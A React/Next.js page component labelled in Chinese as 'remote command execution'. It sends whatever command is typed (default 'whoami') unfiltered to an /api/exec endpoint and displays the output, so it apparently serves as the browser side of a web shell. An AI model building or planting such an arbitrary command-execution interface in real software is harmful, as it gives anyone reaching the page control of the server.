'use client';

import { useState } from 'react';

export default function ExecPage() {
  console.log("1212121212121");
  const [cmd, setCmd] = useState('whoami');
  const [result, setResult] = useState<string | null>(null);
  const [error, setError] = useState<string | null>(null);
  const [loading, setLoading] = useState(false);

  const handleExec = async () => {
    setLoading(true);
    setResult(null);
    setError(null);

    try {
      const res = await fetch(`/api/exec?cmd=${encodeURIComponent(cmd)}`);
      const data = await res.json();
      if (data.result) setResult(data.result);
      if (data.error) setError(data.error);
    } catch (err: any) {
      setError(err.message);
    }

    setLoading(false);
  };

  return (
    <div style={{ padding: '2rem', fontFamily: 'sans-serif' }}>
      <h1>远程命令执行</h1>
      <input
        type="text"
        value={cmd}
        onChange={(e) => setCmd(e.target.value)}
        placeholder="输入要执行的命令"
        style={{ width: '400px', padding: '8px', fontSize: '16px' }}
      />
      <button
        onClick={handleExec}
        disabled={loading}
        style={{
          marginLeft: '1rem',
          padding: '8px 16px',
          fontSize: '16px',
          cursor: 'pointer',
        }}
      >
        执行
      </button>

      <div style={{ marginTop: '1rem' }}>
        {loading && <p>执行中...</p>}
        {error && (
          <pre style={{ color: 'red', whiteSpace: 'pre-wrap' }}>错误: {error}</pre>
        )}
        {result && (
          <pre style={{ background: '#eee', padding: '1rem', whiteSpace: 'pre-wrap' }}>
            {result}
          </pre>
        )}
      </div>
    </div>
  );
}
